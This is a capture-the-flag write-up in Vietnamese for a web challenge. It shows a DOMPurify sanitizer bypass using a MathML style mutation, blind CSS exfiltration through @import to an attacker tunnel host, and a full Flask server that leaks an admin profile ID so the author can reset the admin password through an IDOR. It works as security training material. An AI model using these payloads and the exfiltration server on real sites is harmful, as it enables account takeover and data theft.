- route `/login` và `/register` , `/logout` khá bình thường , khi login thành công sẽ dc redirect qua `/profile`
- Tại `/profile` ta thấy phần input user ko được valid/sanitize ở tầng backend , điều này có thể dẫn đến lỗ hổng XSS đặc biệt là trong bài có service bot như này thì ý đồ tác giả là khá rõ, vấn đề còn lại nằm ở phần front-end
- Tiếp theo là `profile_id ` lấy trực tiếp tham số id, tồn tại lỗ hổng IDOR  vì hàm `get_user_by_id` hoạt động như sau
```python!
def get_user_by_id(profile_id):
    with _conn() as conn:
        row = conn.execute(
            "SELECT username, password, profile_id, bio FROM users WHERE profile_id = ?",
            (profile_id,),
        ).fetchone()
        return dict(row) if row else None
```
Vì chỉ cần biết `profile_id` là ta có thể đổi trực tiếp được password tại route `/reset-password`
```python!
is_admin = bool(user and user["username"] == "admin")

    return render_template(
        "profile.html",
        username=target["username"],
        bio=user["bio"],
        is_owner=bool(user and user["username"] == target["username"]),
        users=db.list_users() if is_admin else [],
    )
```
ta cần xem hàm `list_users()`
![image](/research/kmactf-2026-ii/B1uQ13wYzg.png)
Tức là Admin sẽ có thể xem được `bio` của tất cả user, ngoài ra bio của bot sẽ có flag
![image](/research/kmactf-2026-ii/H1YmbhwFMg.png)


Ta cần xem thêm các bot work
```python!
import os
import shutil
import time

from playwright.sync_api import sync_playwright

import db

WEBAPP_URL = os.environ.get("WEBAPP_URL", "http://web:1337")
CHROMIUM = os.environ.get("CHROMIUM", "chromium")
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
VISIT_INTERVAL = int(os.environ.get("BOT_INTERVAL", "120"))


def admin_password():
    admin = db.get_admin()
    if admin is None:
        raise RuntimeError("admin user not found yet; waiting for the web service")
    return admin["password"]


def visit():
    password = admin_password()
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(
            headless=True,
            executable_path=shutil.which(CHROMIUM) or CHROMIUM,
            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
        )
        try:
            page = browser.new_page()
            page.goto(f"{WEBAPP_URL}/login", wait_until="domcontentloaded")
            page.get_by_label("Username").fill(ADMIN_USER)
            page.get_by_label("Password").fill(password)
            page.get_by_role("button", name="Login").click()
            page.wait_for_timeout(2000)
            #debug*
            print("BOT URL:", page.url, flush=True)
            print("BOT TITLE:", page.title(), flush=True)
            print("BIO COUNT:", page.locator(".user-bio").count(), flush=True)
            print("HREF COUNT:", page.locator('a[href*="/profile?id="]').count(), flush=True)
            print("PAGE LEN:", len(page.content()), flush=True)
            #*debug
        finally:
            browser.close()


def main():
    time.sleep(5)
    while True:
        try:
            visit()
        except Exception as error:
            print(f"bot visit failed: {error}", flush=True)
        time.sleep(VISIT_INTERVAL)


if __name__ == "__main__":
    print("bot started", flush=True)
    main()

```
Mình có chèn thêm một vài đoạn print để debug cho dễ
ta thấy luồng hoạt động của bot khá đơn giản
```bash!
goto /login -> login bằng cred admin từ db -> redirect /profile trong 5s -> đợi 120s để lặp lại tuần hoàn 
```
Với cred admin thì bot có thể xem được bio của all user, và như vậy XSS sẽ là bug thích hợp để get flag
Phần front-end thì mình thấy có load file `js/purify.min.js` và phần bio bị sanitize bởi hàm `Domfurify.sanitize`
```html
<script>
    "use strict";

    const bio = {{ bio | tojson }};
    document.getElementById("output").innerHTML =
      DOMPurify.sanitize(bio);

    const users = {{ users | tojson }};

    document.querySelectorAll(".user-bio").forEach((element) => {
      element.innerHTML =
        DOMPurify.sanitize(users[element.dataset.index].bio);
    });
  </script>
```
Trong file `purify.min.js` có để lộ version Domfurify là `3.4.15` mình tiến hành research để tìm cách bypass
![image](/research/kmactf-2026-ii/HJzAiguKMe.png)
Mình nhận ra version này mới released tuần trước, nên mình có research rất nhiều nhưng chưa tìm được ở đâu nói về cách exploit ở version mới này. phần sanitize của hàm bạn có thể đọc qua [đây](https://github.com/cure53/DOMPurify)
![image](/research/kmactf-2026-ii/BJc66xOKze.png)
> Demo

### CSS injection
Có thể thấy cả trong mã nguồn của Domfurify block rất nhiều `tag` và `attr` như ví dụ trên đó là thuộc tính `onerror`  và thẻ `<script>` đã bị escape
Và mình đã sai lầm khi nghĩ đây là Zero-day và đã mất rất nhiều thời gian đi tìm cách bypass nhưng đều fail, sau đó lúc hết giờ a Trường có hint cho là `CSS injecion` , mình chợt nhớ ra là lúc thi mình có sử dụng đến css nhưng lại ko nhận ra rõ ràng là ko có `CSP`
```htmlembedded!
<p style="color: blue;"><strong>Hello world</strong></p>
```
![image](/research/kmactf-2026-ii/rJvVWbutMg.png)
Sau khi đi tìm hiểu, mình có đọc được ở [Đây](https://portswigger.net/research/blind-css-exfiltration) Kĩ thuật `Blind Attribute Selector` kĩ thuật này sử dụng thẻ `style` và start an exfiltration bằng `@import` request to the exfiltrator server.
Cụ thể CSS attribute selector cho phép kiểm tra giá trị của attribute trong khi đó attribute của chall này là  `href`
```htmlembedded!
<a href="/profile?id={{ user.profile_id }}"> {{ user.username }}</a>
```
```htmlembedded!
a[href^="/profile?id=4"] {
    background-image: url("https://listener.example/4");
}
```
Nếu prefix = 4 thì sẽ fetch đến `https://listener.example/4` -> server ta kiểm soát , từ đó ta sẽ biết được char đầu tiên và làm cơ sở để đoán các char tiếp theo

Nhưng vấn đề là các kĩ thuật này phải đặt trong thẻ `<style>` mà Domfurify lại block thẻ này
![image](/research/kmactf-2026-ii/BJVatWutze.png)
Ta cần tìm cách bypass, và mình có đọc được các bypass thẻ `<style>` tại [Đây](https://securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html) múc đích là sử dụng thẻ `MathML` để đánh lừa Domfurify
ta sẽ test thử
```htmlembedded!
<math><mtext><style>body{background:yellow}</style></mtext></math>
```
![image](/research/kmactf-2026-ii/ryTF0b_Kfl.png)
> Thành công đổi màu background


Tiếp theo, ta cần một server attacker, mình chọn cloudeflare thay vì ngrok cho ổn định

```powershell!
cloudflared tunnel --url http://127.0.0.1:5001
```
ta sẽ cần chèn
```htmlembedded!
<math><mtext><style>@import url(https://further-twist-applicable-trans.trycloudflare.com/start);</style></mtext></math>
```
Mình có tìm được một tool automation hỗ trợ cho việc khai khác [blind-css-exfiltration](https://github.com/hackvertor/blind-css-exfiltration/tree/main) 
Nhưng việc tool State lưu theo IP khiến việc dò `id_user` bị fail, nên mình có tham khảo để cấu hình lại server khớp với chall
### Script
```python!
#!/usr/bin/env python3
import itertools
import os
import threading

from flask import Flask, Response, request


app = Flask(__name__)
PORT = int(os.environ.get("PORT", "5001"))
PUBLIC_URL = (
    os.environ.get("PUBLIC_URL")
    or os.environ.get("HOSTNAME")
    or "https://further-twist-applicable-trans.trycloudflare.com"
).rstrip("/")     #host

ALPHABET = "0123456789abcdef"  # brute force profile_id
LENGTH = 32                    #32 hex
BLOCK = 2   # số char brute mỗi round-> vì bot chạy theo vòng nếu để 1 sẽ mất 32 round
SELECTOR = "section article:nth-of-type(2) a" #chủ đích đặt name=1 để selector element admin do ORDER BY username

lock = threading.Lock()
prefix = ""
round_no = 0
complete = False

@app.get("/")
@app.get("/start")   #trigger
@app.get("/leak.css")
def css():
    global round_no, served_prefix #số round CSS hiện tại và prefix đã dùng để tạo stylesheet gần nhất
    with lock:
        if prefix != served_prefix:
            round_no += 1   #tăng round nếu prefix thay đổi
            served_prefix = prefix
        p, r = prefix, round_no

    if len(p) == LENGTH:
        return Response("done", mimetype="text/css")

    width = min(BLOCK, LENGTH - len(p))  #tính số lượng cần scan ở round hiện tại
    rules = []
    for suffix in itertools.product(ALPHABET, repeat=width):
        value = p + "".join(suffix)
        rules.append(
            f'{SELECTOR}[href^="/profile?id={value}"]{{'
            f'background:url(/l/{value}?r={r})}}'
        )

    response = Response("\n".join(rules), mimetype="text/css")
    response.headers["Cache-Control"] = "no-store"   #không cache stylesheet
    return response


@app.get("/l/<value>")
def leak(value):
    global prefix
    value = value.lower()

    with lock:
        if request.args.get("r") != str(round_no): #kiểm tra callback
            return ("", 204)
        expected = min(len(prefix) + BLOCK, LENGTH)
        if len(value) != expected or not value.startswith(prefix):
            return ("", 204)
        prefix = value
        print(f"[*] admin candidate: {prefix}", flush=True)
        if len(prefix) == LENGTH:
            print(f"[===] ADMIN PROFILE_ID: {prefix}", flush=True)

    return ("", 204)


if __name__ == "__main__":
    print(f"[+] Server is listening on {PORT}", flush=True)
    app.run(host="0.0.0.0", port=PORT, threaded=True)
```
- Với route `/leak.css` nếu các tham số `prefix = "aec46c"` `BLOCK = 2` thì ta sẽ có 256 rule như sau

```css
section article:nth-of-type(2) a[href^="/profile?id=aec46c00"] {
  background: url(/l/aec46c00?r=1)
}

section article:nth-of-type(2) a[href^="/profile?id=aec46c01"] {
  background: url(/l/aec46c01?r=1)
}
....đến aec46cffff
```
Nếu rule index 83 nào đúng thì sẽ fetch đến `/l/aec46c83?r=1` và server sẽ store `aec46c83`
- Route `/l/<value>` sẽ nhận callback từ các CSS rule, cập nhật prefix

### Exploit
Trước hết ta cần regis với cred `1:1` như mục đích ban đầu, sao đó tạo bio với
```htmlembedded!
<math><mtext><style>@import url(https://further-twist-applicable-trans.trycloudflare.com/start);</style></mtext></math>
```
Rồi chạy script trên sau khi xong ta sẽ có được profile_id admin
```
[===] ADMIN PROFILE_ID: aec46c835f55bbbf1badefbabdae9063
```
Thay mật khẩu và lấy flag
![image](/research/kmactf-2026-ii/ryby3t_Yfl.png)

![image](/research/kmactf-2026-ii/B1wRoF_Yfl.png)

### **References**
- https://github.com/hackvertor/blind-css-exfiltration/tree/main
- https://securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
- https://portswigger.net/research/blind-css-exfiltration
